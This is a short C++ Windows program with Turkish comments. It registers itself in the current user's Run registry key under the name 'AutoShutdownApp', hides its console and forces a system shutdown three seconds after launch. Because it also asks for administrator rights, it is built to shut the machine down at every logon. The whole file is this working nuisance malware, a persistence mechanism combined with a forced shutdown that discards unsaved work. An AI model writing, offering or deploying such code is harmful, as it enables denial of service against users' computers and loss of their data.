#include <windows.h>
#include <tchar.h>
#include <iostream>

bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        return false;
    }

    if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    FreeSid(adminGroup);
    return isAdmin == TRUE;
}

void AddToStartup() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);

    // Kullanıcı düzeyinde başlangıca ekle (yönetici gerektirmez)
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, _T("AutoShutdownApp"), 0, REG_SZ,
            (LPBYTE)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));
        RegCloseKey(hKey);
    }
}

void ForceShutdown() {
    // Hızlı kapatma komutu
    ShellExecute(NULL, _T("open"), _T("shutdown.exe"),
        _T("/s /t 3 /f"), NULL, SW_HIDE);
}

int main() {
    // Sadece ilk çalıştırmada yönetici kontrolü
    static bool firstRun = true;
    if (firstRun) {
        if (!IsRunAsAdmin()) {
            TCHAR szPath[MAX_PATH];
            GetModuleFileName(NULL, szPath, MAX_PATH);
            ShellExecute(NULL, _T("runas"), szPath, NULL, NULL, SW_SHOW);
            return 0;
        }

        // Başlangıca ekle (normal kullanıcı yetkileriyle)
        AddToStartup();
        firstRun = false;
    }

    // Konsol penceresini gizle (opsiyonel)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 3 saniye sonra kapat
    ForceShutdown();

    return 0;
}